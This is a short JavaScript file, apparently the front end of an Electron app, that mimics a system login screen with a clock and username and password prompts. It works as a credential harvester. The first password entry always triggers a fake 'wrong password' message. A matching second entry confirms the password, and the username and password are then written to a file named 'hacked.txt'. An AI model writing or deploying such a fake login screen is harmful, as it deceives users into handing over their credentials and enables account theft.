username = "";
password = "";
const options = {
    month: "short",
    day: "numeric",
    hour: "numeric",
    minute: "numeric"
};
function updateDateTime() {
    const now = new Date();
    const currentDateTime = now.toLocaleString("en-US",options).replace(",","").replace("PM","").replace("AM","");
    document.getElementById('datetime').textContent = currentDateTime;
}

function showPasswordScreen() {
    username = document.getElementById('username').value;
    document.getElementById('username-screen').style.display = 'none';
    document.getElementById('password-screen').style.display = 'flex';
}

function showUsernameScreen() {
    document.getElementById('username-screen').style.display = 'flex';
    document.getElementById('password-screen').style.display = 'none';
}

function savePassword(){
    current_password = document.getElementById('password').value;
    if(current_password == "") return;
    if(password != "" && window.electronAPI.compare(current_password, password)) storeLogin();
    else {
        password = window.electronAPI.encrypt(current_password);
        document.getElementById('wrong-message').style.display = 'inline';
    }
}

function storeLogin(){
    window.electronAPI.store('hacked.txt',`${username}: ${password}\n`);
}

updateDateTime();
setInterval(updateDateTime, 1000);